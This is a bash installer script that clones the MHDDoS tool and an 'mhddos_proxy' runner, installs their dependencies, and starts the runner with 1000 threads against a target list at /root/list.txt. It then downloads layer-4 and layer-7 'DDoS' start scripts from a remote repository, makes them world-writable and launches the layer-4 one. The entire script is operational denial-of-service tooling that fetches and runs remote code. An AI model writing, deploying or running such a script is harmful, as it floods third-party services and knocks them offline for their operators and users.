#!/bin/bash
export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
SYS_DT=$(date +%F-%T | tr ':' '_')

exiterr()  { echo "Error: $1" >&2; exit 1; }
exiterr2() { exiterr "'apt-get install' failed."; }
conf_bk() { /bin/cp -f "$1" "$1.old-$SYS_DT" 2>/dev/null; }
bigecho() { echo "## $1"; }


check_root() {
  if [ "$(id -u)" != 0 ]; then
    exiterr "Script must be run as root. Try 'sudo bash $0'"
  fi
}


# Install
apt-get update 
git clone https://github.com/MHProDev/MHDDoS.git /root/MHProDev
apt install python3-pip
cd /root/MHProDev
pip install -r requirements.txt
python3 -m pip install tabulate
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git /root/mhddos_proxy
cd /root/mhddos_proxy; python3 runner.py -t 1000 -c /root/list.txt --debug
wget -O /root/start_layer4.sh https://raw.githubusercontent.com/sania-owner/DDoS/main/start_layer4.sh
wget -O /root/start_layer7.sh https://raw.githubusercontent.com/sania-owner/DDoS/main/start_layer7.sh
chmod 0777 /root/start_layer4.sh
chmod 0777 /root/start_layer7.sh

cd /root; ./start_layer4.sh "&"




